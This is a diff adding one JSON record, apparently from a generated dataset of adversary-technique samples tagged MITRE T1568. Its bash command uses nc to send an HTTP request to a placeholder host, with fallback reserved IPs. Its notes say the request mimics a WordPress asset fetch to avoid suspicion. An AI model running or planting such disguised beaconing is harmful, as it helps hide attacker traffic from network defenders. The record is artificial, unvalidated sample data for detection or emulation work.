@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "bash -c \"host=cdn-assets.example.com; ip=$(dig +short \\\"$host\\\" | shuf -n1); if [ -z \\\"$ip\\\" ]; then for f in 203.0.113.10 198.51.100.10 192.0.2.10; do ip=\\\"$f\\\"; break; done; fi; ua=\\\"Mozilla/5.0\\\"; chk=$(date -u +%s); printf 'GET /wp-content/themes/twentytwenty/style.css?check=%s HTTP/1.1\\r\\nHost: %s\\r\\nUser-Agent: %s\\r\\nAccept: text/css,*/*;q=0.1\\r\\nConnection: close\\r\\n\\r\\n' \\\"$chk\\\" \\\"$host\\\" \\\"$ua\\\" | nc -w 5 \\\"$ip\\\" 80\"",
+  "explanation": "Resolves a CDN-like host and falls back to reserved IPs if resolution fails; emulates normal WordPress theme asset retrieval to avoid raising suspicion.",
+  "rationale_steps": [
+    "Resolve domain at runtime for dynamic endpoint selection.",
+    "Use fallback IP list when DNS resolution is unavailable.",
+    "Mimic benign HTTP GET to a common WordPress asset path.",
+    "Send via nc over standard TCP/80."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-213026ff-3ce72b16",
+  "source_prompt_hash": "213026ff",
+  "timestamp_utc": "2025-09-30T03:23:47.812011Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
